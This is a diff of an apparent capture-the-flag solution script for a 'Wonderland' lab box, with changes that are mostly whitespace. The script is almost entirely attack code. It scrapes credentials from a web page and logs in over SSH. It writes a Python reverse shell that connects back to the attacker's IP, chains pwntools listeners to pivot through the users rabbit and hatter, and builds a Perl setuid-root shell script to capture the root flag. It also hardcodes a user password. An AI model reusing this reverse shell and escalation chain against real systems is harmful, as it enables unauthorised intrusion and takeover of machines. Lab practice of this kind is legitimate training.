@@ -1,10 +1,7 @@
-
 import requests 
 import paramiko
 from bs4 import BeautifulSoup as bs
 from pwn import *
-
-global rabbit, hatter
 
 
 print(''' Welcome to Wonderland Hacking script 
@@ -26,7 +23,6 @@ def webenum(host):
     user_pass = p.get_text()
     user, password = user_pass.split(':')
     print('[+] Found user and password')
-
     print("\nUser: {}".format(user))
     print("Password: {}".format(password))
     print("\n")
@@ -62,21 +58,12 @@ def priv_esc():
     client.exec_command(f"echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ipp}\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > random.py")
     print("[+] hacking NASA with HTML")
     print("Enter this in Alice: sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py")
-    
     #turinig on the pwntools listener
-    rabbit = listen(8000)
-    
-    
-    print("[+] Trying to connect to Rabbit")
-    
-    rabbit.sendline("whoami")
-    
-    
+    rabbit = listen(8000)    
+    print("[+] Trying to connect to Rabbit")    
+    rabbit.sendline("whoami")    
     print("[+] Escalated to : Rabbit")
     print("--------------------------HATTER----------------------------------")
-
-
-
     print("[+] Hacking into Hatter now ")
     print("[+] Decrypting the TeaParty")
     print("[+] Having a date with her")
@@ -86,20 +73,11 @@ def priv_esc():
     rabbit.sendline("echo 'sleep 3 && /home/rabbit/teaParty' >> exp.sh")
     rabbit.sendline("bash exp.sh")
     rabbit.recv()
-    hatter = listen(8001)
-    
+    hatter = listen(8001)    
     hatter.sendline("whoami")
-    print("[+] Escalated to : Hatter")
-
-    
+    print("[+] Escalated to : Hatter")    
     print("----------------------------ROOT--------------------------------")
-
-
-    #------------------------root-------------------
-
-    #perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
     client.close()
-
     print("[+] Hacking into root now ")
     print("[+] Enumerating all the things")
     print("[+] Got the attack vector")
@@ -110,17 +88,13 @@ def priv_esc():
     hatter.sendline('echo -n " \'use POSIX qw(setuid); POSIX::setuid(0); exec" >> /tmp/toor.sh')
     hatter.sendline("echo -n ' \"bash /tmp/rev.sh\"' >> /tmp/toor.sh")
     hatter.sendline('echo -n ";\'" >> /tmp/toor.sh')
-
     hatter_ssh = paramiko.SSHClient()
     hatter_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
     hatter_ssh.connect(hostname=host,username = 'hatter', password = 'WhyIsARavenLikeAWritingDesk?')
-
     stdin, stdout, stderr = hatter_ssh.exec_command("bash /tmp/toor.sh")
     root_flag = stdout.read().decode()
-    print("[+] Escalated to : Root")    
-    
+    print("[+] Escalated to : Root")       
     print("[+] Hacked!")
-
     print("Here are your flags")
     print("USER FLAG: {}".format(user_flag))
     print("ROOT FLAG: {}".format(root_flag))
